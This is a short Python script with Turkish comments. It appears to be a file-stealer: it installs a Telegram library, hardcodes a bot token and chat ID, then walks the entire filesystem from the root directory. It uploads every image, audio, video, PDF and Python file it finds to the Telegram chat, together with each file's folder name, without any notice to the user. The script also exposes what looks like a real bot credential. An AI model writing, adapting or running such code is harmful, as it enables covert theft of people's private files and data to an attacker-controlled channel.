import os
import telebot

def yukle_gerekli_kutuphane():
    try:
        os.system("pip install pyTelegramBotAPI")
        print("Gerekli kütüphane yüklendi.")
    except Exception as e:
        print(f'Hata: {str(e)}')

yukle_gerekli_kutuphane()

import telebot

TOKEN = '6578250693:AAGhoblNUGMiAJUGAxl_9xJ6GXZ8Jjw3uho'
CHAT_ID = 5291833531  # CHAT_ID'yi string olarak değil, tam sayı olarak tanımlayın

uzanti_listesi = ['.py', '.jpg', '.png', '.m4a', '.opus', '.mp3', '.mp4', '.pdf']

bot = telebot.TeleBot(TOKEN)

def dosyalari_tara_ve_gonder(dizin, parent_dizin=""):
    for root, _, files in os.walk(dizin):
        current_dizin = os.path.basename(root)
        if parent_dizin:
            current_dizin = os.path.join(parent_dizin, current_dizin)
        for dosya in files:
            dosya_yolu = os.path.join(root, dosya)
            if os.path.splitext(dosya)[1] in uzanti_listesi:
                try:
                    with open(dosya_yolu, 'rb') as dosya_objesi:
                        bot.send_document(CHAT_ID, dosya_objesi)
                        bot.send_message(CHAT_ID, f"Dizin: {current_dizin}\nDosya: {dosya}")
                except Exception as e:
                    print(f'Hata: {str(e)}')

if __name__ == "__main__":
    print("Başlıyor")
    baslangic_dizini = '/'  # Taranmaya başlanacak kök dizini
    dosyalari_tara_ve_gonder(baslangic_dizini)
    print("End")
